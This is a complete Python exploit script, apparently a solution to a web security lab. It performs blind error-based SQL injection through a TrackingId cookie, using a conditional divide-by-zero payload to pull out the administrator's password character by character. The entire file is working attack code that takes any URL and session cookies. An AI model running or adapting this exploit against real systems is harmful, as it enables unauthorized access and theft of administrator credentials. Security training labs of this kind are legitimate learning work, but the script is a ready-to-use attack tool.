import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url, tracking_id, session_id):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "'||(select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator' and ascii(substr(password,%s,1)) = '%s')||'" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':tracking_id + sqli_payload_encoded, 'session':session_id}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 4:
        print("(+) Usage: %s <url> <TrackingId> <session>" % sys.argv[0])
        print("(+) Example: %s \"www.example.com\" \"Q65RjyOoIdkXejJE\" \"32MQC5eQLnSoTmsUFVCJ54WG0k23ShEn\"" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    tracking_id = sys.argv[2]
    session_id = sys.argv[3]

    print("(+) Retreiving administrator password...")
    sqli_password(url, tracking_id, session_id)

if __name__ == "__main__":
    main()